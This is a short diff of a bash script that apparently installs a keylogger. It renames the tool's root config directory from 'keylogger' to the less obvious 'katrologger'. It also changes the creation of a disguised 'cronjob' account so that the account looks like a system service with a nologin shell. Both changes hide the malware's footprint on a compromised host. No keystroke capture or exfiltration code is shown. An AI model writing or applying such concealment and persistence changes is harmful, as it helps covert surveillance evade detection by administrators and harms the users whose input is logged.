@@ -1,11 +1,11 @@
 #!/bin/bash
-config="/root/.config/keylogger"
+config="/root/.config/katrologger"
 
 if [ $(grep cronjob /etc/passwd | grep -c cronjob) -eq 1 ]
 then
   echo "[+] Cronjob user already exists"
 else
-  useradd --no-create-home --no-user-group --shell /bin/bash cronjob &> /dev/null
+  useradd --system --no-create-home --no-user-group --shell /usr/sbin/nologin cronjob &> /dev/null
   echo "[+] Create user cronjob"
 fi
 
